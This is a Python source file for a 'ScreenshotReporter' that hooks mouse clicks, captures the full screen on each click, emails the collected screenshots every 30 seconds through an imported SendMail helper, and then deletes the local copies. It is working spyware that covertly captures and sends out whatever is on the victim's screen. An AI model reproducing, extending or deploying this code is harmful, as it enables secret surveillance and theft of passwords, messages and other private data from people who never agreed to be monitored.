import logging
import threading
from pathlib import Path

from PIL import ImageGrab
from pynput.mouse import Listener

from mailLogger import SendMail

logger = logging.getLogger(__name__)

DEFAULT_SCREENSHOT_DIR = "./screenshot"
DEFAULT_REPORT_INTERVAL = 30
DEFAULT_MAX_SCREENSHOTS = 100


class ScreenshotReporter:
    def __init__(
        self,
        screenshot_dir: str = DEFAULT_SCREENSHOT_DIR,
        report_interval: int = DEFAULT_REPORT_INTERVAL,
        max_screenshots: int = DEFAULT_MAX_SCREENSHOTS,
    ) -> None:
        self.screenshot_dir = Path(screenshot_dir)
        self.report_interval = report_interval
        self.max_screenshots = max_screenshots
        self.image_number = 0
        self._timer: threading.Timer | None = None

        self.screenshot_dir.mkdir(parents=True, exist_ok=True)

    def take_screenshot(self) -> None:
        image = ImageGrab.grab()
        file_path = self.screenshot_dir / f"Screenshot_{self.image_number:04d}.png"
        image.save(str(file_path))
        self.image_number += 1
        self._enforce_limit()

    def clean_directory(self) -> None:
        for file in self.screenshot_dir.iterdir():
            if file.is_file():
                file.unlink()
        print("File Cleaned...")

    def _enforce_limit(self) -> None:
        if self.max_screenshots <= 0:
            return
        files = sorted(
            (f for f in self.screenshot_dir.iterdir() if f.is_file()),
            key=lambda f: f.stat().st_mtime,
        )
        excess = len(files) - self.max_screenshots
        for old_file in files[:max(0, excess)]:
            old_file.unlink()

    def on_click(self, x: int, y: int, button, pressed: bool) -> None:
        if pressed:
            self.take_screenshot()
            print("Screenshot Taken")

    def _schedule_report(self) -> None:
        self._timer = threading.Timer(self.report_interval, self._report)
        self._timer.daemon = True
        self._timer.start()

    def _report(self) -> None:
        try:
            SendMail(str(self.screenshot_dir))
            print("Mail Sent")
        except Exception:
            logger.exception(
                "SendMail failed for directory '%s'; "
                "skipping clean and continuing report loop",
                self.screenshot_dir,
            )
        else:
            self.clean_directory()
        finally:
            self._schedule_report()

    def start_reporting(self) -> None:
        self._schedule_report()

    def stop_reporting(self) -> None:
        if self._timer:
            self._timer.cancel()
            self._timer = None

    def run(self) -> None:
        with Listener(on_click=self.on_click) as listener:
            self.start_reporting()
            try:
                listener.join()
            except KeyboardInterrupt:
                pass
            finally:
                self.stop_reporting()
                listener.stop()


if __name__ == "__main__":
    ScreenshotReporter().run()
